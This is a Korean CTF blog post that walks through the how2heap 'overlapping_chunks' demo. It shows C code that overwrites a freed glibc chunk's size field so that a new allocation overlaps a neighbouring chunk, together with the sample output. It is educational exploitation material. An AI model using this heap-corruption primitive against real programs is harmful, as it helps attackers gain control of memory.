@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+	<meta name="naver-site-verification" content="e19266ac7916f4f7f8ebeef5355bdce5102d3416">
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-140827316-1"></script>
+	<script>
+  window.dataLayer = window.dataLayer || [];
+			     function gtag(){dataLayer.push(arguments);}
+			     gtag('js', new Date());
+			     gtag('config', 'UA-140827316-1');
+	</script>
+    
+
+    
+    <title>[How2Heap] Overlapping_Chunks | j0n9hyun</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+        <meta name="keywords" content="Theory">
+    
+    <meta name="description" content="Overlapping_Chunks.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;">
+<meta name="keywords" content="Theory">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[How2Heap] Overlapping_Chunks">
+<meta property="og:url" content="http://j0n9hyun.github.io/2019/06/20/How2Heap-Overlapping-Chunks/index.html">
+<meta property="og:site_name" content="j0n9hyun">
+<meta property="og:description" content="Overlapping_Chunks.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;">
+<meta property="og:locale" content="ko">
+<meta property="og:updated_time" content="2019-06-20T14:09:51.401Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[How2Heap] Overlapping_Chunks">
+<meta name="twitter:description" content="Overlapping_Chunks.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;">
+    
+	<link rel="canonical" href="http://j0n9hyun.github.io/2019/06/20/how2heap-overlapping-chunks/">
+
+    
+
+    
+        <link rel="icon" href="https://favicon-generator.org/favicon-generator/htdocs/favicons/2015-01-14/318ab48694395838406763908d9a1dad.ico">
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/titillium-web/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+	<link rel="stylesheet" type="text/css" href>
+	<link rel="stylesheet" href="https://cdn.rawgit.com/innks/NanumSquareRound/master/nanumsquareround.css">	
+	<link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/nanumgothiccoding.css">
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/3.3.1/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+    
+    
+    
+
+
+</head>
+</html>
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+					<a href="/" style="font-size:40px;color:#fff; font-weight:bold; font-style: italic;text-decoration: none;">j0n9hyun's Blog</a>
+                    </h1>
+                    
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item">
+                                    <a class="main-nav-list-link" href="/">Home</a>
+                                </li>
+                            
+                                        <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Daily/">Daily</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Theory/">Theory</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/">WriteUps</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Foren/">Foren</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Misc/">Misc</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Pwn/">Pwn</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Script/">Script</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Web/">Web</a></li></ul></li></ul>
+                                    
+                                <li class="main-nav-list-item">
+                                    <a class="main-nav-list-link" href="https://about.me/j0n9hyun">About</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="검색">
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="입력">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '포스트',
+            PAGES: 'Pages',
+            CATEGORIES: '카테고리',
+            TAGS: '태그',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/Theory/">Theory</a>
+    </h1>
+</div>
+
+                        <div class="main-body-content">
+                            <article id="post-How2Heap-Overlapping-Chunks" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        [How2Heap] Overlapping_Chunks
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-meta">
+                
+    <div class="article-date">
+        <a href="/2019/06/20/How2Heap-Overlapping-Chunks/" class="article-date">
+            <time datetime="2019-06-20T13:59:02.000Z" itemprop="datePublished">2019-06-20</time>
+        </a>
+    </div>
+
+		
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/Theory/">Theory</a>
+    </div>
+
+  			<span class="reading-time">⏱ 7 분</span>
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="overlapping_chunksc"><a class="markdownIt-Anchor" href="#overlapping_chunksc"></a> Overlapping_Chunks.c</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 glibc에서 tcache옵션이 disabled된 상태에만 작동한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nsimple chunks overlapping\n\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"heap에 chunk 3개를 할당해보자.\n"</span>);</span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3개의 chunk가 여기에 할당됐다:\np1=%p\np2=%p\np3=%p\n"</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p1, <span class="string">'1'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p2, <span class="string">'2'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이제 p2 chunk를 free시켜보자\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p2 chuck는 이제 unsorted bin안에서 그 크기의 새로운 malloc()을 제공할 준비가 되어있다\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 p2를 free시킨 chunk의 크키를 overwrite할 수 있는 overflow를 시연해보자.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"toy 프로그램의 경우, 마지막 세 개의 bit값은 중요하지 않다;"</span></span><br><span class="line"><span class="string">"하지만, heap의 안정성을 유지하는 것이 베스트다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 안정성을 유지하기 위해 우리는 최하위 bit를 1(prev_inuse)로 표시할 것이다,"</span></span><br><span class="line"><span class="string">"p1이 free chunk로 오인하지 않고 확실히 하기 위해\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line"><span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 p2 chunk의 크기를 %d로 설정할 것이다, 그렇게 하는 것은 우리에게 \n%d의 region size를 준다.\n"</span>,</span><br><span class="line">evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// 우리는 p2 chunk의 "크기" field를 overwrite하고 있다.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이제 다른 chunk를 주입된 p2 chunk의 데이터 크기와 똑같은 크기에 할당해준다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 malloc은 우리가 크기를 바꾸었던, unsorted bin안에 있는, 전에 free되었던 chunk로부터 제공되어질 것이다.\n"</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4는 %p에 할당되었고 and %p에서 끝난다.\n"</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3는 %p에서 시작해 %p에서 끝난다\n"</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4는 p3와 overlap되어야한다, 이 경우에 p4는 모든 p3를 포함한다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이제 p4 chunk안에 복사된 모든 것들은 p3 chunk에 있는 데이터를 overwrite할 수 있다,"</span></span><br><span class="line"><span class="string">"그리고 p3 chunk에 쓰여진 데이터는 p4 chunk 안에 저장되어있는 데이터를 overwrite할 수 있다.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 예시를 돌려보자. 지금, 우리는 가지고 있다:\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIf we memset(p4, '4', %d), we have:\n"</span>, evil_region_size);</span><br><span class="line"><span class="built_in">memset</span>(p4, <span class="string">'4'</span>, evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nAnd if we then memset(p3, '3', 80), we have:\n"</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>이 기법은 glibc에서 tcache옵션이 disabled된 상태에만 작동한다.</p>
+<p><code>simple chunks overlapping</code></p>
+<p>heap에 chunk 3개를 할당해보자.<br>
+3개의 chunk가 여기에 할당됐다:<br>
+<code>p1=0x603010</code><br>
+<code>p2=0x603110</code><br>
+<code>p3=0x603210</code></p>
+<p>이제 p2 chunk를 free시켜보자<br>
+p2 chuck는 이제 unsorted bin안에서 그 크기의 새로운 malloc()을 제공할 준비가 되어있다<br>
+이제 p2를 free시킨 chunk의 크키를 overwrite할 수 있는 overflow를 시연해보자.<br>
+toy 프로그램의 경우, 마지막 세 개의 bit값은 중요하지 않다.<br>
+하지만, heap의 안정성을 유지하는 것이 베스트다.<br>
+이 안정성을 유지하기 위해 우리는 최하위 bit를 1(prev_inuse)로 표시할 것이다.<br>
+p1이 free chunk로 오인하지 않고 확실히 하기 위해 우리는 p2 chunk의 크기를 385로 설정할 것이다. 그렇게 하는 것은 우리에게 376의 region size를 준다.</p>
+<p>이제 다른 chunk를 주입된 p2 chunk의 데이터 크기와 똑같은 크기에 할당해준다.<br>
+이 malloc은 우리가 크기를 바꾸었던, unsorted bin안에 있는, 전에 free되었던 chunk로부터 제공되어질 것이다.</p>
+<p>p4는 <code>0x603110</code>에 할당되었고 <code>0x603288</code>에서 끝난다.<br>
+p3는 <code>0x603210</code>에서 시작해 <code>0x603288</code>에서 끝난다<br>
+p4는 p3와 overlap되어야한다, 이 경우에 p4는 모든 p3를 포함한다.</p>
+<p>이제 p4 chunk안에 복사된 모든 것들은 p3 chunk에 있는 데이터를 overwrite할 수 있다<br>
+그리고 p3 chunk에 쓰여진 데이터는 p4 chunk 안에 저장되어있는 데이터를 overwrite할 수 있다.</p>
+<p>이제 예시를 돌려보자. 지금, 우리는 가지고 있다:<br>
+<code>p4 = x</code><br>
+<code>3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333</code></p>
+<p>If we memset(p4, ‘4’, 376), we have:<br>
+<code>p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444</code><br>
+<code>p3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444</code></p>
+<p>And if we then memset(p3, ‘3’, 80), we have:<br>
+<code>p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444</code><br>
+<code>p3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444</code></p>
+
+        </div>
+        <footer class="article-footer">
+            
+
+
+
+    <a data-url="http://j0n9hyun.github.io/2019/06/20/How2Heap-Overlapping-Chunks/" data-id="cjx4qhhyu0005mofpzegyjmb3" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "author": {
+            "@type": "Person",
+            "name": "j0n9hyun"
+        },
+        "headline": "[How2Heap] Overlapping_Chunks",
+        "image": "http://j0n9hyun.github.io",
+        "keywords": "Theory",
+        "genre": "Theory",
+        "datePublished": "2019-06-20",
+        "dateCreated": "2019-06-20",
+        "dateModified": "2019-06-20",
+        "url": "http://j0n9hyun.github.io/2019/06/20/How2Heap-Overlapping-Chunks/",
+        "description": " Overlapping_Chunks.c
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &"
+        "wordCount": 743
+    }
+</script>
+
+</article>
+
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+    
+    </section>
+
+
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>정보:</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="facebook" href="https://www.facebook.com/j0n9hyun" target="_blank" rel="noopener">
+                        <i class="icon fa fa-facebook"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/j0n9hyun/CTF" target="_blank" rel="noopener">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+    
+        <a href="/2019/06/13/ida-7.0-korean-string-apply/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">이전 글</strong>
+        <p class="article-nav-title">IDA Pro 한글 스트링 적용 방법</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+
+            
+                
+    <div class="widget-wrap">
+        <h3 class="widget-title">최근 글</h3>
+        <div class="widget">
+            <ul id="recent-post" class="no-thumbnail">
+                
+                    <li>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Theory/">Theory</a></p>
+                            <p class="item-title"><a href="/2019/06/20/How2Heap-Overlapping-Chunks/" class="title">[How2Heap] Overlapping_Chunks</a></p>
+                            <p class="item-date"><time datetime="2019-06-20T13:59:02.000Z" itemprop="datePublished">2019-06-20</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Daily/">Daily</a></p>
+                            <p class="item-title"><a href="/2019/06/13/ida-7.0-korean-string-apply/" class="title">IDA Pro 한글 스트링 적용 방법</a></p>
+                            <p class="item-date"><time datetime="2019-06-13T04:37:48.000Z" itemprop="datePublished">2019-06-13</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">카테고리</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Daily/">Daily</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Theory/">Theory</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/">WriteUps</a><span class="category-list-count">22</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Foren/">Foren</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Misc/">Misc</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Pwn/">Pwn</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Script/">Script</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Web/">Web</a><span class="category-list-count">1</span></li></ul></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">태그</h3>
+        <div class="widget">
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">21</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Theory/">Theory</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tips/">Tips</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wargame/">Wargame</a><span class="tag-list-count">1</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">링크</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="https://ctf.j0n9hyun.xyz">HackCTF</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+            
+        
+    </div>
+</aside>
+
+                </div>
+            </div>
+        </div>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="credit">
+                <p>&copy; 2019 j0n9hyun</p>
+                <p>Team <a href="https://ctf.j0n9hyun.xyz" target="_blank">Defenit</a>.</p>
+            </div>
+            <div class="footer-plugins">
+              
+    
+
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+        
+    
+    <script>
+    var disqus_shortname = 'j0n9hyun';
+    
+    
+    var disqus_url = 'http://j0n9hyun.github.io/2019/06/20/How2Heap-Overlapping-Chunks/';
+    
+    (function() {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+    
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
